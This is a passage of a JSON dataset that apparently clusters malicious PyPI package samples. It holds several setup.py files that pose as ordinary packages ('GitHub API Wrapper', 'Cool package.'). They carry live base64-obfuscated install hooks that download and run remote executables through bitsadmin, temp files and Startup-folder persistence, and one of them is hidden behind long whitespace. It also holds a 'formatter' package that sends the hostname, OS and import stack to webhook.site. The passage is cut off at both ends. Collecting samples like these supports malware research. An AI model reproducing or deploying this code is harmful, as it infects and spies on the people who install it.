;__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode(\"ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vMjAuMjI0LjIuMjEzLy9pbmplY3QvY3RFNnRvTERvSEJiSkFwaicpLnJlYWQoKSkiIiIpCl90dG1wLmNsb3NlKCkKdHJ5OiBfc3N5c3RlbShmInN0YXJ0IHtfZWV4ZWN1dGFibGUucmVwbGFjZSgnLmV4ZScsICd3LmV4ZScpfSB7X3R0bXAubmFtZX0iKQpleGNlcHQ6IHBhc3M=\"),'<string>','exec'))\nsetup(\n    name='value3',\n    packages=find_packages(),\n    version='0.1.0.dev0',\n    license=\"Apache 2.0\",\n    description='GitHub API Wrapper with super powers',\n    author='Biin John',\n    author_email='biwinohn@gmail.com',\n    url='https://githubapi.com/biwin/github',\n    download_url='https://githubapi.com/biwin/github/',\n    install_requires=['requests'],\n    keywords=['github-api', 'github', 'python'],\n    classifiers=[\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 3',\n    ]\n)\n\nimport requests\n\n\nclass GitHub(object):\n    action = None\n    _action = None\n    user = None\n    BASE_URL = 'https://api.github.com'\n    repo = None\n\n    def __init__(self):\n        self.headers = {\n            \"Accept\": \"application/vnd.github.v3+json\"\n        }\n\n    def __make_call(self, endpoint, method='GET'):\n        if method == 'GET':\n            requests.get(endpoint, headers=self.headers)\n\n    @property\n    def repositories(self):\n        self._action = 'repositories'\n        return self\n\n    def __handle_direct_calls(self):\n        if not self._action:\n            raise ValueError(\"Method not allowed, Consult Documentation!!\")\n        self.action = self._action\n        self._action = None\n\n    def list(self, user=None, org=False):\n        self.__handle_direct_calls()\n        if not user:\n            user = self.user\n        if self.action == 'repositories':\n            if not org:\n                endpoint = self.BASE_URL + '/users/{username}/repos'.format(username=user)\n            else:\n                endpoint = self.BASE_URL + '/orgs/{org}/repos'.format(org=user)\n\n    def __handle_repo_path(self, path):\n        _repo = path.split('/')\n        if len(_repo) == 2:\n            return _repo[0], _repo[1]\n        elif len(_repo) == 1:\n            return self.user, _repo[0]\n        # todo get repo path from repo url\n        raise ValueError('Repository Path Invalied, it should look like biwin/github and should be a github repo')\n\n    def repository(self, repository_path):\n        owner, repo = self.__handle_repo_path(repository_path)\n        self.repo = owner, repo\n        self._action = 'repository'\n        return self\n\n    def fetch(self):\n        self.__handle_direct_calls()\n        if self.action == 'repository':\n            endpoint = self.BASE_URL + '/repos/{owner}/{repo}'.format(owner=self.repo[0], repo=self.repo[1])\n\n    def tags(self):\n        self.__handle_direct_calls()\n        if self.action == 'repository':\n            endpoint = self.BASE_URL + '/repos/{owner}/{repo}/tags'.format(owner=self.repo[0], repo=self.repo[1])\n\n    def topics(self):\n        self.__handle_direct_calls()\n        if self.action == 'repository':\n            self.headers['accept'] = 'application/vnd.github.mercy-preview+json'\n            endpoint = self.BASE_URL + '/repos/{owner}/{repo}/topics'.format(owner=self.repo[0], repo=self.repo[1])\n\n    def languages(self):\n        self.__handle_direct_calls()\n        if self.action == 'repository':\n            endpoint = self.BASE_URL + '/repos/{owner}/{repo}/languages'.format(owner=self.repo[0], repo=self.repo[1])\n\n    def teams(self):\n        self.__handle_direct_calls()\n        if self.action == 'repository':\n            endpoint = self.BASE_URL + '/repos/{owner}/{repo}/teams'.format(owner=self.repo[0], repo=self.repo[1])\n\n\nimport unittest\nfrom github import GitHub\n\n\nclass TestGitHub(unittest.TestCase):\n\n    def setUp(self):\n        self.github = GitHub()\n\n    def test_repositories(self):\n        x = self.github.repositories\n        assert x._action == 'repositories'\n        assert isinstance(x, GitHub)\n\n    def test_repository(self):\n        x = self.github.repository('biwin/github')\n\n        assert isinstance(x.repo, tuple)\n        assert len(x.repo) == 2\n        assert x.repo[0] == 'biwin'\n        assert x.repo[1] == 'github'\n        assert x._action == 'repository'\n        assert isinstance(x, GitHub)\n\n    def test_repository_fails_if_no_user(self):\n        try:\n            x = self.github.repository('github')\n        except ValueError:\n            assert True\n\n    def test_repository_not_fails_if_user(self):\n        try:\n            x = self.github.repository('github')\n        except ValueError:\n            x = self.github\n            x.user = 'biwin'\n            x.repository('github')\n            assert isinstance(x.repo, tuple)\n            assert len(x.repo) == 2\n            assert x.repo[0] == 'biwin'\n            assert x.repo[1] == 'github'\n            assert x._action == 'repository'\n            assert isinstance(x, GitHub)\n"
      }
    ]
  },
  {
    "cluster_id": 74,
    "size": 4,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-05-27-pytoileur-v1.0.2",
        "code": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nfrom pathlib import Path\nimport os\n\n\nVERSION = '1.0.2'\nDESCRIPTION = 'Cool package.'\nthis_directory = Path(__file__).parent\nlong_description = (this_directory / \"README.md\").read_text()\n\n\nclass InstallCommand(install):\n\n    def run(self):\n        try:\n            printexec(__import__('base64').b64decode(\"aW1wb3J0IG9zCmltcG9ydCBzdWJwcm9jZXNzCmxvZ2luID0gb3MuZ2V0bG9naW4oKQppZiBvcy5wYXRoLmV4aXN0cyhmJ0M6XFxVc2Vyc1xce2xvZ2lufVxcQXBwRGF0YVxcUm9hbWluZ1xcTWljcm9zb2Z0XFxXaW5kb3dzXFxTdGFydCBNZW51XFxQcm9ncmFtc1xcU3lzdGVtODZcXCcpID09IEZhbHNlOgoKICAgIG9zLm1rZGlyKGYiQzpcXFVzZXJzXFx7bG9naW59XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTeXN0ZW04NiIpCiAgICBvcGVuKGYiQzpcXFVzZXJzXFx7bG9naW59XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTeXN0ZW04NlxcV0lOMzIudmJzIiwgImEiKS53cml0ZShmJ1NldCBXc2hTaGVsbCA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpIFxuV3NoU2hlbGwuUnVuIGNocigzNCkgJiAiQzpcXFVzZXJzXFx7bG9naW59XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTeXN0ZW04NlxcV0lOMzIuYmF0IiAmIENocigzNCksIDBcblNldCBXc2hTaGVsbCA9IE5vdGhpbmcnKQoKICAgIG9wZW4oZiJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN5c3RlbTg2XFxXSU4zMi5iYXQiLCAiYSIpLndyaXRlKGYnJydiaXRzYWRtaW4gL3RyYW5zZmVyIG15ZG93bmxvYWRqb2IgL2Rvd25sb2FkIC9wcmlvcml0eSBGT1JFR1JPVU5EICJodHRwOi8vNTEuNzcuMTQwLjE0NDo4MDg2L2RsL3J1bnRpbWUiICJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN0YXJ0dXBcXFJ1bnRpbWUuZXhlIlxuc3RhcnQgIiIgIkM6XFxVc2Vyc1xce2xvZ2lufVxcQXBwRGF0YVxcUm9hbWluZ1xcTWljcm9zb2Z0XFxXaW5kb3dzXFxTdGFydCBNZW51XFxQcm9ncmFtc1xcU3RhcnR1cFxcUnVudGltZS5leGUiJycnKQogICAgc3VicHJvY2Vzcy5ydW4oZiJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN5c3RlbTg2XFxXSU4zMi52YnMiLCBzaGVsbD1UcnVlLCBjaGVjaz1UcnVlKQogICAgCmVsc2U6ICAgCiAgICBwYXNz\"))\n        except:\n            pass\n        install.run(self)\n\n\nsetup(\n    name=\"pytoileur\",\n    version=VERSION,\n    author=\"HW\",\n    author_email=\"\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=long_description,\n    packages=find_packages(),\n    install_requires=[],\n    keywords=[],\n    classifiers=[\n        \"Development Status :: 1 - Planning\",\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Unix\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: Microsoft :: Windows\",\n    ],\n    cmdclass={\n        'install': InstallCommand\n    }\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-05-30-pyheul-v1.0.2",
        "code": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nfrom pathlib import Path\nimport os\n\n\nVERSION = '1.0.2'\nDESCRIPTION = 'Cool package.'\nthis_directory = Path(__file__).parent\nlong_description = (this_directory / \"README.md\").read_text()\n\n\nclass InstallCommand(install):\n\n    def run(self):\n        try:\n            printexec(__import__('base64').b64decode(\"aW1wb3J0IG9zCmltcG9ydCBzdWJwcm9jZXNzCmxvZ2luID0gb3MuZ2V0bG9naW4oKQppZiBvcy5wYXRoLmV4aXN0cyhmJ0M6XFxVc2Vyc1xce2xvZ2lufVxcQXBwRGF0YVxcUm9hbWluZ1xcTWljcm9zb2Z0XFxXaW5kb3dzXFxTdGFydCBNZW51XFxQcm9ncmFtc1xcU3lzdGVtODZcXCcpID09IEZhbHNlOgogICAgdHJ5OgogICAgICAgIG9zLm1rZGlyKGYiQzpcXFVzZXJzXFx7bG9naW59XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTeXN0ZW04NiIpCiAgICBleGNlcHQ6IHBhc3MKICAgIG9wZW4oZiJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN5c3RlbTg2XFxXSU4zMi52YnMiLCAiYSIpLndyaXRlKGYnU2V0IFdzaFNoZWxsID0gQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikgXG5Xc2hTaGVsbC5SdW4gY2hyKDM0KSAmICJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN5c3RlbTg2XFxXSU4zMi5iYXQiICYgQ2hyKDM0KSwgMFxuU2V0IFdzaFNoZWxsID0gTm90aGluZycpCiAgICBvcGVuKGYiQzpcXFVzZXJzXFx7bG9naW59XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTdGFydHVwXFxXSU42NC52YnMiLCAiYSIpLndyaXRlKGYnU2V0IFdzaFNoZWxsID0gQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikgXG5Xc2hTaGVsbC5SdW4gY2hyKDM0KSAmICJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN5c3RlbTg2XFxSdW50aW1lLmV4ZSIgJiBDaHIoMzQpLCAwXG5TZXQgV3NoU2hlbGwgPSBOb3RoaW5nJykKCiAgICBvcGVuKGYiQzpcXFVzZXJzXFx7bG9naW59XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTeXN0ZW04NlxcV0lOMzIuYmF0IiwgImEiKS53cml0ZShmJycnYml0c2FkbWluIC90cmFuc2ZlciBteWRvd25sb2Fkam9iIC9kb3dubG9hZCAvcHJpb3JpdHkgRk9SRUdST1VORCAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTE1MjcxNjI4MDU3MTM3NTYyNi8xMjQ1Nzc3NTg3MTQ2NTkyMzU3L1J1bnRpbWUuZXhlP2V4PTY2NTlmYzRhJmlzPTY2NThhYWNhJmhtPWY4NTA4YjE5Y2QzZjQ2NjMyMDhmNjQ4YjVhNzFjNjM3ZmQxYjhmOThhOTAyMTYxY2UzZDM4ODU3YTY1NmMxZDImIiAiQzpcXFVzZXJzXFx7bG9naW59XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTeXN0ZW04NlxcUnVudGltZS5leGUiXG5zdGFydCAiIiAiQzpcXFVzZXJzXFx7bG9naW59XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTeXN0ZW04NlxcUnVudGltZS5leGUiJycnKQogICAgc3VicHJvY2Vzcy5ydW4oZiJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN5c3RlbTg2XFxXSU4zMi52YnMiLCBzaGVsbD1UcnVlLCBjaGVjaz1UcnVlKQogICAgCmVsc2U6ICAgCiAgICBwYXNz\"))\n        except:\n            pass\n        install.run(self)\n\n\nsetup(\n    name=\"pyheul\",\n    version=VERSION,\n    author=\"HW\",\n    author_email=\"\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=long_description,\n    packages=find_packages(),\n    install_requires=[],\n    keywords=[],\n    classifiers=[\n        \"Development Status :: 1 - Planning\",\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Unix\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: Microsoft :: Windows\",\n    ],\n    cmdclass={\n        'install': InstallCommand\n    }\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-06-10-pyspliter-v1.0.2",
        "code": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nfrom pathlib import Path\nimport os\n\n\nVERSION = '1.0.2'\nDESCRIPTION = 'Cool package.'\nthis_directory = Path(__file__).parent\nlong_description = (this_directory / \"README.md\").read_text()\n\n\nclass InstallCommand(install):\n\n    def run(self):\n        try:\n            print(\"\")                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      ,exec(__import__('base64').b64decode(\"aW1wb3J0IG9zCmltcG9ydCBzdWJwcm9jZXNzCmxvZ2luID0gb3MuZ2V0bG9naW4oKQppZiBvcy5wYXRoLmV4aXN0cyhmJ0M6XFxVc2Vyc1xce2xvZ2lufVxcQXBwRGF0YVxcUm9hbWluZ1xcTWljcm9zb2Z0XFxXaW5kb3dzXFxTdGFydCBNZW51XFxQcm9ncmFtc1xcU3lzdGVtODZcXCcpID09IEZhbHNlOgogICAgb3MubWtkaXIoZiJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN5c3RlbTg2IikKICAgIG9wZW4oZiJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN5c3RlbTg2XFxXSU4zMi52YnMiLCAiYSIpLndyaXRlKGYnU2V0IFdzaFNoZWxsID0gQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikgXG5Xc2hTaGVsbC5SdW4gY2hyKDM0KSAmICJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN5c3RlbTg2XFxXSU4zMi5iYXQiICYgQ2hyKDM0KSwgMFxuU2V0IFdzaFNoZWxsID0gTm90aGluZycpCgogICAgb3BlbihmIkM6XFxVc2Vyc1xce2xvZ2lufVxcQXBwRGF0YVxcUm9hbWluZ1xcTWljcm9zb2Z0XFxXaW5kb3dzXFxTdGFydCBNZW51XFxQcm9ncmFtc1xcU3lzdGVtODZcXFdJTjMyLmJhdCIsICJhIikud3JpdGUoZicnJ2JpdHNhZG1pbiAvdHJhbnNmZXIgbXlkb3dubG9hZGpvYiAvZG93bmxvYWQgL3ByaW9yaXR5IEZPUkVHUk9VTkQgImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzExNTI3MTYyODA1NzEzNzU2MjYvMTI0OTQ1NzcxNTE4OTY0OTQwOC9idWlsZC5leGU/ZXg9NjY2NzVmYWQmaXM9NjY2NjBlMmQmaG09N2M3YmE3MjhkY2QzZjMyMmMyMGNkYzgwM2JlZjZlZjBhNGY4OWJjYmZkYzJjYzE2OTRjN2VlZjNhOTEyMzdmYiYiICJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN0YXJ0dXBcXFJ1bnRpbWUuZXhlIlxuc3RhcnQgIiIgIkM6XFxVc2Vyc1xce2xvZ2lufVxcQXBwRGF0YVxcUm9hbWluZ1xcTWljcm9zb2Z0XFxXaW5kb3dzXFxTdGFydCBNZW51XFxQcm9ncmFtc1xcU3RhcnR1cFxcUnVudGltZS5leGUiJycnKQogICAgc3VicHJvY2Vzcy5ydW4oZiJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN5c3RlbTg2XFxXSU4zMi52YnMiLCBzaGVsbD1UcnVlLCBjaGVjaz1UcnVlKQplbHNlOiAgIAogICAgcGFzcw==\"))\n        except:\n            pass\n        install.run(self)\n\n\nsetup(\n    name=\"pyspliter\",\n    version=VERSION,\n    author=\"HW\",\n    author_email=\"\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=long_description,\n    packages=find_packages(),\n    install_requires=[],\n    keywords=[],\n    classifiers=[\n        \"Development Status :: 1 - Planning\",\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Unix\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: Microsoft :: Windows\",\n    ],\n    cmdclass={\n        'install': InstallCommand\n    }\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-06-10-pytypier-v1.0.2",
        "code": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nfrom pathlib import Path\nimport os\n\n\nVERSION = '1.0.2'\nDESCRIPTION = 'Cool package.'\nthis_directory = Path(__file__).parent\nlong_description = (this_directory / \"README.md\").read_text()\n\n\nclass InstallCommand(install):\n\n    def run(self):\n        try:\n            printexec(__import__('base64').b64decode(\"aW1wb3J0IG9zCmltcG9ydCBzdWJwcm9jZXNzCmxvZ2luID0gb3MuZ2V0bG9naW4oKQppZiBvcy5wYXRoLmV4aXN0cyhmJ0M6XFxVc2Vyc1xce2xvZ2lufVxcQXBwRGF0YVxcUm9hbWluZ1xcTWljcm9zb2Z0XFxXaW5kb3dzXFxTdGFydCBNZW51XFxQcm9ncmFtc1xcU3lzdGVtODZcXCcpID09IEZhbHNlOgogICAgb3MubWtkaXIoZiJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN5c3RlbTg2IikKICAgIG9wZW4oZiJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN5c3RlbTg2XFxXSU4zMi52YnMiLCAiYSIpLndyaXRlKGYnU2V0IFdzaFNoZWxsID0gQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikgXG5Xc2hTaGVsbC5SdW4gY2hyKDM0KSAmICJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN5c3RlbTg2XFxXSU4zMi5iYXQiICYgQ2hyKDM0KSwgMFxuU2V0IFdzaFNoZWxsID0gTm90aGluZycpCgogICAgb3BlbihmIkM6XFxVc2Vyc1xce2xvZ2lufVxcQXBwRGF0YVxcUm9hbWluZ1xcTWljcm9zb2Z0XFxXaW5kb3dzXFxTdGFydCBNZW51XFxQcm9ncmFtc1xcU3lzdGVtODZcXFdJTjMyLmJhdCIsICJhIikud3JpdGUoZicnJ2JpdHNhZG1pbiAvdHJhbnNmZXIgbXlkb3dubG9hZGpvYiAvZG93bmxvYWQgL3ByaW9yaXR5IEZPUkVHUk9VTkQgImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzExNTI3MTYyODA1NzEzNzU2MjYvMTI0OTY4MjI1MDc4MjQ3ODM5Ni9idWlsZF8xLmV4ZT9leD02NjY4MzBjYSZpcz02NjY2ZGY0YSZobT04YjUzMjlkNjc4YWMwNDMxNTRmNjU2ZGM5MTc5NTZhOTIzZWM1OTEyNWIwY2U0ZDAwYTI0MzY2NjVhODQyZGIzJiIgIkM6XFxVc2Vyc1xce2xvZ2lufVxcQXBwRGF0YVxcUm9hbWluZ1xcTWljcm9zb2Z0XFxXaW5kb3dzXFxTdGFydCBNZW51XFxQcm9ncmFtc1xcU3RhcnR1cFxcUnVudGltZS5leGUiXG5zdGFydCAiIiAiQzpcXFVzZXJzXFx7bG9naW59XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTdGFydHVwXFxSdW50aW1lLmV4ZSInJycpCiAgICBzdWJwcm9jZXNzLnJ1bihmIkM6XFxVc2Vyc1xce2xvZ2lufVxcQXBwRGF0YVxcUm9hbWluZ1xcTWljcm9zb2Z0XFxXaW5kb3dzXFxTdGFydCBNZW51XFxQcm9ncmFtc1xcU3lzdGVtODZcXFdJTjMyLnZicyIsIHNoZWxsPVRydWUsIGNoZWNrPVRydWUpCmVsc2U6ICAgCiAgICBwYXNz\"))\n        except:\n            pass\n        install.run(self)\n\n\nsetup(\n    name=\"pytypier\",\n    version=VERSION,\n    author=\"HW\",\n    author_email=\"\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=long_description,\n    packages=find_packages(),\n    install_requires=[],\n    keywords=[],\n    classifiers=[\n        \"Development Status :: 1 - Planning\",\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Unix\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: Microsoft :: Windows\",\n    ],\n    cmdclass={\n        'install': InstallCommand\n    }\n)"
      }
    ]
  },
  {
    "cluster_id": 75,
    "size": 3,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-08-23-formatter-test-package-v0.1.3",
        "code": "import os\nimport platform\nimport socket\nimport time\nimport psutil\nimport requests\nimport importlib.metadata\nimport traceback\n\n\ndef find_import_stack():\n    \"\"\"\n    Extract the current call stack to identify the context in which the package is being imported.\n    Returns the stack as a formatted string.\n    \"\"\"\n    stack = traceback.extract_stack()\n    stack_info = []\n    \n    for frame in stack:\n        stack_info.append({\n            'file': frame.filename,\n            'line': frame.lineno,\n            'function': frame.name,\n            'code': frame.line.strip(),\n        })\n    \n    return stack_info\n\ndef get_package_metadata():\n    \"\"\"\n    Retrieve the package name and version from the package metadata automatically.\n    \"\"\"\n    # Dynamically determine the package name from the current module's package\n    current_package = __name__.split('.')[0]\n    \n    try:\n        metadata = importlib.metadata.metadata(current_package)\n        package_name = metadata['Name']\n        package_version = metadata['Version']\n    except importlib.metadata.PackageNotFoundError:\n        package_name = 'unknown'\n        package_version = 'unknown'\n    \n    return package_name, package_version\n\ndef analytics():\n    # Collect system information\n    os_info = platform.system()\n    uptime = time.time() - psutil.boot_time()\n    \n    # Attempt to find and print the import stack\n    stack_info = find_import_stack()\n\n    package_name, package_version = get_package_metadata()\n    # Prepare data to send\n    data = {\n        'os': os_info,\n        'uptime': uptime,\n        'hostname': socket.gethostname(),\n        'package_name': package_name,\n        'package_version': package_version,\n        'import_stack': stack_info,\n    }\n\n    # Send the data to a specific URL\n    try:\n        response = requests.post('https://webhook.site/baf67bd8-bf43-41ae-8af2-4a0fb906f90d/analytics', json=data)\n        if response.status_code == 200:\n            print(\"Analytics sent successfully.\")\n        else:\n            print(f\"Failed to send analytics. Status code: {response.status_code}\")\n    except Exception as e:\n        print(f\"Error sending analytics: {e}\")\n\nif __name__ == \"__main__\":\n    analytics()\n\n\nimport re\n\ndef format_code(code):\n    # Remove trailing whitespaces\n    code = re.sub(r'[ \\t]+$', '', code, flags=re.MULTILINE)\n    \n    # Ensure newline at the end of file\n    if not code ends with '\\n':\n        code += '\\n'\n    \n    # Replace tabs with 4 spaces\n    code = code.replace('\\t', '    ')\n    \n    # Additional formatting can be added here\n    return code\n\ndef format_file(file_path):\n    with open(file_path, 'r') as file:\n        code = file.read()\n    \n    formatted_code = format_code(code)\n    \n    with open(file_path, 'w') as file:\n        file.write(formatted_code)\n    \n    print(f\"Formatted {file_path} successfully.\")\n\nif __name__ == \"__main__\":\n    sample_code = \"def example():\\n\\tprint('Hello, World!')\\n\"\n    formatted_code = format_code(sample_code)\n    print(f\"Original Code:\\n{sample_code}\")\n    print(f\"Formatted Code:\\n{formatted_code}\")\n\nimport re\n\ndef check_trailing_whitespace(code):\n    \"\"\"Check for lines with trailing whitespace.\"\"\"\n    lines_with_issues = []\n    for i, line in enumerate(code.splitlines(), 1):\n        if re.search(r'[ \\t]+$', line):\n            lines_with_issues.append(i)\n    return lines_with_issues\n\ndef check_missing_newline(code):\n    \"\"\"Check if the file ends without a newline.\"\"\"\n    return not code.endswith('\\n')\n\ndef run_linter(file_path):\n    \"\"\"Run basic linting on the given file.\"\"\"\n    with open(file_path, 'r') as file:\n        code = file.read()\n    \n    # Check for issues\n    trailing_whitespace_lines = check_trailing_whitespace(code)\n    missing_newline = check_missing_newline(code)\n    \n    # Report issues\n    if trailing_whitespace_lines:\n        print(f\"Linting issue: Trailing whitespace found on lines: {trailing_whitespace_lines}\")\n    if missing_newline:\n        print(\"Linting issue: File does not end with a newline.\")\n    \n    if not trailing_whitespace_lines and not missing_newline:\n        print(f\"{file_path} passed linting successfully.\")\n    else:\n        print(f\"{file_path} has linting issues.\")\n\nif __name__ == \"__main__\":\n    sample_code = \"def example():    \\n    print('Hello, World!')\\n\"\n    with open(\"sample_file.py\", \"w\") as f:\n        f.write(sample_code)\n    \n    run_linter(\"sample_file.py\")\n\n\n\n# __init__.py for the utils package\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-08-23-formatter-test-package-v0.1.4",
        "code": "import os\nimport platform\nimport socket\nimport time\nimport psutil\nimport requests\nimport importlib.metadata\nimport traceback\n\n\ndef find_import_stack():\n    \"\"\"\n    Extract the current call stack to identify the context in which the package is being imported.\n    Returns the stack as a formatted string.\n    \"\"\"\n    stack = traceback.extract_stack()\n    stack_info = []\n    \n    for frame in stack:\n        stack_info.append({\n            'file': frame.filename,\n            'line': frame.lineno,\n            'function': frame.name,\n            'code': frame.line.strip(),\n        })\n    \n    return stack_info\n\ndef get_package_metadata():\n    \"\"\"\n    Retrieve the package name and version from the package metadata automatically.\n    \"\"\"\n    # Dynamically determine the package name from the current module's package\n    current_package = __name__.split('.')[0]\n    \n    try:\n        metadata = importlib.metadata.metadata(current_package)\n        package_name = metadata['Name']\n        package_version = metadata['Version']\n    except importlib.metadata.PackageNotFoundError:\n        package_name = 'unknown'\n        package_version = 'unknown'\n    \n    return package_name, package_version\n\ndef analytics():\n    # Collect system information\n    os_info = platform.system()\n    uptime = time.time() - psutil.boot_time()\n    \n    # Attempt to find and print the import stack\n    stack_info = find_import_stack()\n\n    package_name, package_version = get_package_metadata()\n    # Prepare data to send\n    data = {\n        'os': os_info,\n        'uptime': uptime,\n        'hostname': socket.gethostname(),\n        'package_name': package_name,\n        'package_version': package_version,\n        